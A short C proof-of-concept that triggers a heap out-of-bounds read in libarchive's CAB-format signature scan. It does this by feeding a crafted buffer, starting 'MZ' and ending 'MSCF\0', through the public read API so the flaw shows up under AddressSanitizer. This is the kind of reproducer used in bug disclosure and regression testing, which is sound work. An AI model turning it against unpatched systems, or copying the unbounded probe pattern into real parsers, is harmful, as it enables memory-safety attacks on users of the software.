/*
 * Proof-of-concept: heap out-of-bounds read in the CAB reader's
 * self-extracting-archive signature scan.
 *
 * Drives the public libarchive API with a short PE-stub-looking buffer
 * ("MZ" followed by filler) whose last five bytes are "MSCF\0".  During
 * archive_read_open_memory, the cab bidder scans the buffer for the
 * cabinet signature and probes candidate offsets right up to the end of
 * the available data; a probe that verifies eight bytes at an offset
 * where only five remain reads past the end of the caller's buffer.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "archive.h"
#include "archive_entry.h"

#define BUF_SIZE 8190			/* multiple of the 5-byte stride */

int
main(void)
{
	struct archive *a;
	struct archive_entry *ae;
	unsigned char *buf;
	int r;

	/* Private heap copy: reading past the end is an ASan violation. */
	buf = malloc(BUF_SIZE);
	if (buf == NULL)
		return (1);
	memset(buf, 'A', BUF_SIZE);
	buf[0] = 'M';
	buf[1] = 'Z';			/* PE executable signature */
	memcpy(buf + BUF_SIZE - 5, "MSCF\0", 5);

	a = archive_read_new();
	if (a == NULL) {
		free(buf);
		return (1);
	}
	archive_read_support_format_cab(a);
	/* The cab bidder's signature scan runs from in here. */
	archive_read_open_memory(a, buf, BUF_SIZE);

	r = ARCHIVE_OK;
	while (r == ARCHIVE_OK || r == ARCHIVE_WARN || r == ARCHIVE_RETRY)
		r = archive_read_next_header(a, &ae);

	archive_read_free(a);
	free(buf);
	printf("no crash\n");
	return (0);
}
